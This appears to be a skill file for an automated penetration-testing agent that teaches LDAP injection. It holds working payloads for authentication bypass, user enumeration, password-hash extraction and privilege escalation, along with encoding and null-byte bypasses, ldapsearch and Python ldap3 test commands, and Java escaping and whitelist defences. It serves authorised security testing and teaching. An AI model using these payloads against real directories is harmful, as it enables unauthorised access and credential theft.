---
name: ldap-injection-testing
description: Professional skills and methodology for LDAP injection vulnerability testing
version: 1.0.0
---

# LDAP Injection Vulnerability Testing

## Overview

LDAP injection is a vulnerability similar to SQL injection. It exploits flaws in how LDAP query statements are constructed and can lead to information disclosure, authentication bypass, and more. This skill provides methods for detecting, exploiting, and protecting against LDAP injection.

## Vulnerability Mechanics

The application concatenates user input directly into LDAP query statements without adequate validation and filtering, allowing attackers to modify query logic.

**Dangerous code example:**
```java
String filter = "(&(cn=" + userInput + ")(userPassword=" + password + "))";
ldapContext.search(baseDN, filter, ...);
```

## LDAP Basics

### Query Syntax

**Basic queries:**
```
(cn=John)
(objectClass=person)
(&(cn=John)(mail=john@example.com))
(|(cn=John)(cn=Jane))
(!(cn=John))
```

### Special Characters

**Characters that must be escaped:**
- `(` `)` - parentheses
- `*` - wildcard
- `\` - escape character
- `/` - path separator
- `NUL` - null byte

## Testing Methodology

### 1. Identify LDAP Input Points

**Common functionality:**
- User login
- User search
- Directory browsing
- Permission validation

### 2. Basic Detection

**Test special characters:**
```
*)(&
*)(|
*))(
*))%00
```

**Test logical operators:**
```
*)(&(cn=*
*)(|(cn=*
*))(!(cn=*
```

### 3. Authentication Bypass

**Basic bypass:**
```
用户名: *)(&
密码: *
查询: (&(cn=*)(&)(userPassword=*))
```

**More precise bypass:**
```
用户名: admin)(&(cn=admin
密码: *))
查询: (&(cn=admin)(&(cn=admin)(userPassword=*)))
```

### 4. Information Disclosure

**Enumerate users:**
```
*)(cn=*
*)(uid=*
*)(mail=*
```

**Retrieve attributes:**
```
*)(|(cn=*)(userPassword=*
*)(|(objectClass=*)(cn=*
```

## Exploitation Techniques

### Authentication Bypass

**Method 1: Logical bypass**
```
输入: *)(&
查询: (&(cn=*)(&)(userPassword=*))
结果: 匹配所有用户
```

**Method 2: Comment bypass**
```
输入: admin)(&(cn=admin
查询: (&(cn=admin)(&(cn=admin)(userPassword=*)))
```

**Method 3: Wildcard**
```
输入: *)(|(cn=*)(userPassword=*
查询: (&(cn=*)(|(cn=*)(userPassword=*)(userPassword=*))
```

### Information Disclosure

**Enumerate all users:**
```
搜索: *)(cn=*
结果: 返回所有cn属性
```

**Extract password hashes:**
```
搜索: *)(|(cn=*)(userPassword=*
结果: 返回用户和密码哈希
```

**Extract sensitive attributes:**
```
搜索: *)(|(cn=*)(mail=*)(telephoneNumber=*
结果: 返回多个敏感属性
```

### Privilege Escalation

**Modify query logic:**
```
原始: (&(cn=user)(memberOf=CN=Users,DC=example,DC=com))
注入: user)(memberOf=CN=Admins,DC=example,DC=com))(|(cn=user
结果: 可能绕过权限检查
```

## Bypass Techniques

### Encoding Bypass

**URL encoding:**
```
*)(& → %2A%29%28%26
*)(| → %2A%29%28%7C
```

**Unicode encoding:**
```
* → \u002A
( → \u0028
) → \u0029
```

### Comment Bypass

**Using comments:**
```
*)(&(cn=*
*)(|(cn=*
```

### Null Byte Injection

**Using NULL bytes:**
```
*))%00
```

## Tool Usage

### JXplorer

**Graphical LDAP client:**
- Connect to LDAP servers
- Browse directory structure
- Execute query tests

### ldapsearch

```bash
# 基础查询
ldapsearch -x -H ldap://target.com -b "dc=example,dc=com" "(cn=*)"

# 测试注入
ldapsearch -x -H ldap://target.com -b "dc=example,dc=com" "(cn=*)(&"
```

### Burp Suite

1. Intercept LDAP query requests
2. Modify query parameters
3. Observe response results

### Python Script

```python
import ldap3

server = ldap3.Server('ldap://target.com')
conn = ldap3.Connection(server, authentication=ldap3.SIMPLE,
                        user='cn=admin,dc=example,dc=com',
                        password='password')

# 测试注入
filter_str = '*)(&'
conn.search('dc=example,dc=com', filter_str)
print(conn.entries)
```

## Verification and Reporting

### Verification Steps

1. Confirm that the LDAP query can be controlled
2. Verify authentication bypass or information disclosure
3. Assess the impact (unauthorized access, data breach, etc.)
4. Document a complete PoC
5. Record confirmed vulnerabilities in the platform via the `report_finding` tool (the sole entry point for vulnerability records on this platform); fields cover location, type, severity, reproduction steps/PoC, and remediation recommendations

### Reporting Key Points

- Vulnerability location and input parameters
- How the LDAP query is constructed
- Complete exploitation steps and PoC
- Remediation recommendations (input validation, parameterized queries, etc.)

## Protective Measures

### Recommended Approaches

1. **Input validation**
   ```java
   private static final String[] LDAP_ESCAPE_CHARS = 
       {"\\", "*", "(", ")", "\0", "/"};
   
   public static String escapeLDAP(String input) {
       if (input == null) {
         return null;
       }
       StringBuilder sb = new StringBuilder();
       for (int i = 0; i < input.length(); i++) {
         char c = input.charAt(i);
         if (Arrays.asList(LDAP_ESCAPE_CHARS).contains(String.valueOf(c))) {
           sb.append("\\");
         }
         sb.append(c);
       }
       return sb.toString();
   }
   ```

2. **Parameterized queries**
   ```java
   // 使用LDAP API的参数化功能
   String filter = "(&(cn={0})(userPassword={1}))";
   Object[] args = {escapedCN, escapedPassword};
   // 使用API构建查询
   ```

3. **Whitelist validation**
   ```java
   // 只允许特定字符
   if (!input.matches("^[a-zA-Z0-9@._-]+$")) {
       throw new IllegalArgumentException("Invalid input");
   }
   ```

4. **Least privilege**
   - Use a least-privilege account for LDAP connections
   - Restrict queryable attributes
   - Use access control lists

5. **Error handling**
   - Do not return detailed error messages
   - Use unified error responses
   - Log errors

## Key Considerations

- Only test in authorized testing environments
- Pay attention to syntax differences between LDAP servers
- Avoid impacting the directory during testing
- Understand the target LDAP server's configuration
